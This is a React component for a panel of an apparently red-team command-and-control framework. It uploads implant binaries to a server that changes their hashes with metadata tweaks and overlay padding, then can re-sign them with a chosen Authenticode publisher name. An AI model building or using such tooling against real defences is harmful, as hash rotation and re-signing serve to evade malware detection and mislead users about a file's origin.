import React, { useCallback, useEffect, useRef, useState } from 'react';
import styled from 'styled-components';
import axios from 'axios';
import { toast } from 'react-toastify';
import { FiDownload, FiRefreshCw, FiShield, FiTrash2, FiUploadCloud } from 'react-icons/fi';

const Section = styled.section`
  animation: fadeIn 0.35s ease-out;
  min-height: calc(100vh - 120px);

  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(8px); }
    to { opacity: 1; transform: translateY(0); }
  }
`;

const Head = styled.div`
  margin-bottom: 20px;

  h2 {
    margin: 0;
    font-family: 'Syne', system-ui, sans-serif;
    font-size: 22px;
    font-weight: 700;
    color: #eef1f6;
  }

  p {
    margin: 8px 0 0;
    color: #8b93a7;
    font-size: 13px;
    max-width: 640px;
    line-height: 1.5;
  }
`;

const Grid = styled.div`
  display: grid;
  grid-template-columns: 1.1fr 1fr;
  gap: 28px;

  @media (max-width: 980px) {
    grid-template-columns: 1fr;
  }
`;

const Card = styled.div`
  background: #12151c;
  border: 1px solid #2a3140;
  border-radius: 12px;
  padding: 18px;
`;

const DropZone = styled.div`
  border: 2px dashed ${props => (props.$active ? 'rgba(198, 242, 62, 0.55)' : '#3d4658')};
  background: ${props => (props.$active ? 'rgba(198, 242, 62, 0.06)' : '#161a22')};
  border-radius: 12px;
  padding: 28px 16px;
  text-align: center;
  cursor: pointer;
  transition: border-color 0.15s, background 0.15s;

  .icon {
    font-size: 32px;
    color: #c6f23e;
    margin-bottom: 10px;
  }

  strong {
    display: block;
    color: #eef1f6;
    font-size: 14px;
    margin-bottom: 6px;
  }

  span {
    color: #8b93a7;
    font-size: 12px;
  }
`;

const Field = styled.label`
  display: flex;
  flex-direction: column;
  gap: 6px;
  margin-top: 14px;
  font-size: 12px;
  color: #8b93a7;
  text-transform: uppercase;
  letter-spacing: 0.08em;
  font-weight: 600;
`;

const Input = styled.input`
  background: #161a22;
  border: 1px solid #2a3140;
  color: #eef1f6;
  border-radius: 8px;
  padding: 10px 12px;
  font-size: 14px;
  font-family: inherit;
  text-transform: none;
  letter-spacing: normal;
  font-weight: 500;
  outline: none;

  &:focus {
    border-color: #c6f23e;
  }
`;

const CheckRow = styled.label`
  display: flex;
  align-items: center;
  gap: 10px;
  margin-top: 14px;
  color: #aeb6c7;
  font-size: 13px;
  cursor: pointer;

  input {
    accent-color: #c6f23e;
  }
`;

const PrimaryBtn = styled.button`
  margin-top: 18px;
  width: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  padding: 12px 16px;
  border: none;
  border-radius: 10px;
  background: linear-gradient(135deg, #c6f23e 0%, #9ed62a 100%);
  color: #0d0f14;
  font-weight: 700;
  font-size: 14px;
  font-family: inherit;
  cursor: pointer;

  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }
`;

const Note = styled.p`
  margin: 14px 0 0;
  font-size: 12px;
  color: #6d7589;
  line-height: 1.45;
`;

const BuildsHead = styled.div`
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 12px;

  h3 {
    margin: 0;
    font-size: 15px;
    color: #eef1f6;
  }
`;

const IconBtn = styled.button`
  background: transparent;
  border: 1px solid #2a3140;
  color: #aeb6c7;
  border-radius: 8px;
  padding: 8px;
  cursor: pointer;

  &:hover {
    border-color: #c6f23e;
    color: #c6f23e;
  }
`;

const BuildRow = styled.div`
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 10px 0;
  border-bottom: 1px solid #1e2430;
  font-size: 13px;
  color: #aeb6c7;

  .meta {
    flex: 1;
    min-width: 0;
  }

  .name {
    color: #eef1f6;
    font-weight: 600;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }

  .sub {
    font-size: 11px;
    color: #6d7589;
    margin-top: 2px;
  }

  button {
    background: transparent;
    border: none;
    color: #8b93a7;
    cursor: pointer;
    padding: 6px;

    &:hover {
      color: #c6f23e;
    }
  }
`;

const authHeaders = () => ({
  Authorization: `Bearer ${localStorage.getItem('fahis_token') || localStorage.getItem('c2_token') || ''}`,
});

function formatBytes(n) {
  if (!n && n !== 0) return '';
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  return `${(n / (1024 * 1024)).toFixed(2)} MB`;
}

const ExeMutator = () => {
  const inputRef = useRef(null);
  const [file, setFile] = useState(null);
  const [dragActive, setDragActive] = useState(false);
  const [outputName, setOutputName] = useState('');
  const [signCode, setSignCode] = useState(true);
  const [signSubject, setSignSubject] = useState('');
  const [busy, setBusy] = useState(false);
  const [builds, setBuilds] = useState([]);
  const [signingInfo, setSigningInfo] = useState(null);

  const loadBuilds = useCallback(async () => {
    try {
      const res = await axios.get('/api/builder/builds', { headers: authHeaders() });
      const all = res.data?.builds || [];
      setBuilds(all.filter((b) => b.tool === 'pe-mutate' || b.variant === 'mutate'));
    } catch (_) {
      /* ignore */
    }
  }, []);

  const loadSigning = useCallback(async () => {
    try {
      const res = await axios.get('/api/builder/signing/status', { headers: authHeaders() });
      if (res.data) setSigningInfo(res.data);
    } catch (_) {}
  }, []);

  useEffect(() => {
    loadBuilds();
    loadSigning();
  }, [loadBuilds, loadSigning]);

  const pickFile = (f) => {
    if (!f) return;
    const name = f.name || '';
    if (!/\.(exe|dll|bin|elf|so)$/i.test(name)) {
      toast.warn('Expected PE (.exe/.dll) or ELF — will validate on server');
    }
    setFile(f);
  };

  const handleMutate = async () => {
    if (!file) {
      toast.error('Choose a file first');
      return;
    }
    setBusy(true);
    try {
      const fd = new FormData();
      fd.append('file', file);
      if (outputName.trim()) fd.append('outputName', outputName.trim());
      fd.append('signCode', signCode ? 'true' : 'false');
      if (signSubject.trim()) fd.append('signSubject', signSubject.trim());

      const res = await axios.post('/api/builder/mutate', fd, {
        headers: {
          ...authHeaders(),
          'Content-Type': 'multipart/form-data',
        },
        timeout: 300000,
      });
      const b = res.data?.build;
      if (b?.sha256 && b?.sourceSha256 && b.sha256 === b.sourceSha256) {
        toast.warn('Hash unchanged — try again or check file type');
      } else if (b?.authenticodeSigned) {
        toast.success(`Mutated & signed · ${b.sha256?.slice(0, 12)}…`);
      } else if (signCode && b?.signNote) {
        toast.warn(`Mutated (unsigned): ${b.signNote}`);
      } else {
        toast.success(`New signature · sha256 ${b?.sha256?.slice(0, 12) || '?'}…`);
      }
      setFile(null);
      if (inputRef.current) inputRef.current.value = '';
      await loadBuilds();
    } catch (e) {
      toast.error(e.response?.data?.error || e.message || 'Mutate failed');
    } finally {
      setBusy(false);
    }
  };

  const handleDownload = (id, fileName) => {
    const token = localStorage.getItem('fahis_token') || localStorage.getItem('c2_token') || '';
    if (!token) {
      toast.error('Not logged in');
      return;
    }
    const a = document.createElement('a');
    a.href = `/api/builder/download/${encodeURIComponent(id)}?token=${encodeURIComponent(token)}`;
    a.download = fileName || 'mutated.exe';
    a.rel = 'noopener';
    document.body.appendChild(a);
    a.click();
    a.remove();
  };

  const handleDelete = async (id, fileName) => {
    if (!window.confirm(`Delete "${fileName}"?`)) return;
    try {
      await axios.delete(`/api/builder/delete/${id}`, { headers: authHeaders() });
      toast.success('Removed');
      await loadBuilds();
    } catch (e) {
      toast.error(e.response?.data?.error || 'Delete failed');
    }
  };

  return (
    <Section>
      <Head>
        <h2>Binary signature rotator</h2>
        <p>
          Upload an existing EXE or DLL. The server rotates PE metadata and appends unique overlay padding
          so the hash changes without recompiling or patching code. Windows builds can be re-signed with
          your lab Authenticode cert (same as Generate Implant).
        </p>
      </Head>

      <Grid>
        <Card>
          <input
            ref={inputRef}
            type="file"
            accept=".exe,.dll,.bin,.elf,.so"
            style={{ display: 'none' }}
            onChange={(e) => pickFile(e.target.files?.[0])}
          />
          <DropZone
            $active={dragActive}
            onClick={() => inputRef.current?.click()}
            onDragEnter={(e) => {
              e.preventDefault();
              setDragActive(true);
            }}
            onDragLeave={() => setDragActive(false)}
            onDragOver={(e) => e.preventDefault()}
            onDrop={(e) => {
              e.preventDefault();
              setDragActive(false);
              pickFile(e.dataTransfer.files?.[0]);
            }}
          >
            <FiUploadCloud className="icon" />
            <strong>{file ? file.name : 'Drop EXE / DLL here or click to browse'}</strong>
            <span>{file ? formatBytes(file.size) : 'Max 100 MB · PE recommended'}</span>
          </DropZone>

          <Field>
            Output name (optional)
            <Input
              value={outputName}
              onChange={(e) => setOutputName(e.target.value)}
              placeholder="Leave blank to keep original name"
              disabled={busy}
            />
          </Field>

          <CheckRow>
            <input
              type="checkbox"
              checked={signCode}
              onChange={(e) => setSignCode(e.target.checked)}
              disabled={busy}
            />
            <FiShield />
            Re-sign with lab Authenticode (Windows teamserver + .exe/.dll)
          </CheckRow>

          {signCode && (
            <Field>
              Publisher name (optional)
              <Input
                value={signSubject}
                onChange={(e) => setSignSubject(e.target.value)}
                placeholder={signingInfo?.defaultSubject || 'CN=...'}
                disabled={busy}
              />
            </Field>
          )}

          <PrimaryBtn type="button" onClick={handleMutate} disabled={busy || !file}>
            {busy ? 'Mutating…' : 'Mutate & download-ready'}
          </PrimaryBtn>

          <Note>
            Logic is unchanged: only PE timestamp / DOS noise and trailing overlay bytes are added (loader ignores overlay).
            ELF uploads get overlay only. Prior Authenticode on the file is replaced when re-signing succeeds.
            {signingInfo && !signingInfo.canSignWindows && signCode && (
              <> Signing needs a Windows host with signtool.</>
            )}
          </Note>
        </Card>

        <Card>
          <BuildsHead>
            <h3>Recent mutations</h3>
            <IconBtn type="button" onClick={loadBuilds} title="Refresh">
              <FiRefreshCw />
            </IconBtn>
          </BuildsHead>
          {builds.length === 0 ? (
            <Note style={{ marginTop: 0 }}>No mutated binaries yet.</Note>
          ) : (
            builds.map((b) => (
              <BuildRow key={b.id}>
                <div className="meta">
                  <div className="name">{b.fileName}</div>
                  <div className="sub">
                    {formatBytes(b.size)}
                    {b.sourceName ? ` · from ${b.sourceName}` : ''}
                    {b.authenticodeSigned ? ' · signed' : ''}
                    <br />
                    <code>{b.sha256?.slice(0, 16)}…</code>
                    {b.sourceSha256 ? (
                      <>
                        {' '}
                        (was <code>{b.sourceSha256.slice(0, 12)}…</code>)
                      </>
                    ) : null}
                  </div>
                </div>
                <button type="button" title="Download" onClick={() => handleDownload(b.id, b.fileName)}>
                  <FiDownload />
                </button>
                <button type="button" title="Delete" onClick={() => handleDelete(b.id, b.fileName)}>
                  <FiTrash2 />
                </button>
              </BuildRow>
            ))
          )}
        </Card>
      </Grid>
    </Section>
  );
};

export default ExeMutator;
